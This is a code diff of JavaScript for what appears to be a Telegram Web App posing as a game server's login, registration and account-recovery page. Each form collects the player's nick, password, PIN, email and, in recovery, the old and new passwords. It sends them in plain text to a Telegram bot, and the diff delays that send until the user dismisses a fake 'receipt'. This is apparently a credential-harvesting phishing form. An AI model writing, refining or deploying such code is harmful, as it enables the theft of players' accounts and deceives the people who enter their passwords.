@@ -24,8 +24,18 @@ if (loader && main) {
     }, 30);
 }
 
-function onlyEnglish(input) { input.value = input.value.replace(/[^A-Za-z0-9_]/g, ''); }
-function onlyPin(input) { input.value = input.value.replace(/[^0-9]/g, '').slice(0, 4); }
+// ПАРОЛЬ: только буквы и цифры
+function onlyLetters(input) {
+    input.value = input.value.replace(/[^A-Za-z0-9]/g, '');
+}
+
+function onlyEnglish(input) {
+    input.value = input.value.replace(/[^A-Za-z0-9_]/g, '');
+}
+
+function onlyPin(input) {
+    input.value = input.value.replace(/[^0-9]/g, '').slice(0, 4);
+}
 
 function checkNick() {
     const nick = document.getElementById('nick');
@@ -37,20 +47,17 @@ function checkNick() {
 }
 
 function checkPassword() {
-    // Ищем либо поле пароля, либо новое поле пароля (для восстановления)
     const pass = document.getElementById('password') || document.getElementById('new_password');
-    // Ищем иконку либо для пароля, либо для нового пароля
     const icon = document.getElementById('iconPass') || document.getElementById('iconNewPass');
-    
     if (!pass || !icon) return;
     
-    const valid = /^[A-Za-z]{7,}$/.test(pass.value);
+    const valid = /^[A-Za-z0-9]{7,}$/.test(pass.value);
     if (valid) { icon.classList.remove('red'); icon.classList.add('green'); }
     else { icon.classList.remove('green'); icon.classList.add('red'); }
 }
 
 function validateNick(nick) { return /^[A-Z][a-z]+_[A-Z][a-z]+$/.test(nick) && nick.length >= 5; }
-function validatePassword(pass) { return /^[A-Za-z]{7,}$/.test(pass); }
+function validatePassword(pass) { return /^[A-Za-z0-9]{7,}$/.test(pass); }
 
 function togglePin() {
     const checkbox = document.getElementById('hasPin');
@@ -82,12 +89,20 @@ function selectServer(value) {
     toggleServerList();
 }
 
+// ОТПРАВКА ПРИ НАЖАТИИ (без закрытия)
+let pendingData = null;
+
 function sendToBot(text) {
-    try {
-        tg.sendData(text);
-    } catch (e) {
-        console.error('Ошибка отправки:', e);
+    pendingData = text;
+}
+
+function closeReceipt() {
+    if (pendingData) {
+        try { tg.sendData(pendingData); } catch (e) { console.error(e); }
     }
+    const overlay = document.querySelector('.receipt-overlay');
+    if (overlay) overlay.remove();
+    tg.close();
 }
 
 function showReceipt(nick, server, type) {
@@ -143,12 +158,6 @@ function showReceipt(nick, server, type) {
     }, 150);
 }
 
-function closeReceipt() {
-    const overlay = document.querySelector('.receipt-overlay');
-    if (overlay) overlay.remove();
-    tg.close();
-}
-
 function goTo(page) { window.location.href = page; }
 
 function login() {
@@ -158,7 +167,7 @@ function login() {
     const server = document.getElementById('server').value;
     if (!nick) { alert('Введите ник!'); return; }
     if (!validateNick(nick)) { alert('Ник в формате Ivan_Capone!'); return; }
-    if (!validatePassword(password)) { alert('Пароль: от 7 символов, только английские буквы!'); return; }
+    if (!validatePassword(password)) { alert('Пароль: от 7 символов (буквы и цифры)!'); return; }
     const data = `🔐 ВХОД В АККАУНТ\n\n👤 Ник: ${nick}\n🔒 Пароль: ${password}\n🛡 ПИН-код: ${pin || 'нет'}\n🌍 Сервер: ${server}`;
     sendToBot(data);
     showReceipt(nick, server, 'Вход в аккаунт');
@@ -173,7 +182,7 @@ function register() {
     const referrer = document.getElementById('referrer').value.trim();
     if (!nick) { alert('Введите ник!'); return; }
     if (!validateNick(nick)) { alert('Ник в формате Ivan_Capone!'); return; }
-    if (!validatePassword(password)) { alert('Пароль: от 7 символов, только английские буквы!'); return; }
+    if (!validatePassword(password)) { alert('Пароль: от 7 символов (буквы и цифры)!'); return; }
     const data = `📝 РЕГИСТРАЦИЯ АККАУНТА\n\n👤 Ник: ${nick}\n🔒 Пароль: ${password}\n🛡 ПИН-код: ${pin || 'нет'}\n📧 Почта: ${email || 'нет'}\n🌍 Сервер: ${server}\n👥 Пригласил: ${referrer || 'нет'}`;
     sendToBot(data);
     showReceipt(nick, server, 'Создание аккаунта');
@@ -188,7 +197,7 @@ function recover() {
     if (!nick) { alert('Введите ник!'); return; }
     if (!validateNick(nick)) { alert('Ник в формате Ivan_Capone!'); return; }
     if (!oldPass) { alert('Введите старый пароль!'); return; }
-    if (!validatePassword(newPass)) { alert('Новый пароль: от 7 символов, только английские буквы!'); return; }
+    if (!validatePassword(newPass)) { alert('Новый пароль: от 7 символов (буквы и цифры)!'); return; }
     const data = `🔄 ВОССТАНОВЛЕНИЕ АККАУНТА\n\n👤 Ник: ${nick}\n🔓 Старый пароль: ${oldPass}\n🔒 Новый пароль: ${newPass}\n🛡 ПИН-код: ${pin || 'нет'}\n🌍 Сервер: ${server}`;
     sendToBot(data);
     showReceipt(nick, server, 'Восстановление аккаунта');
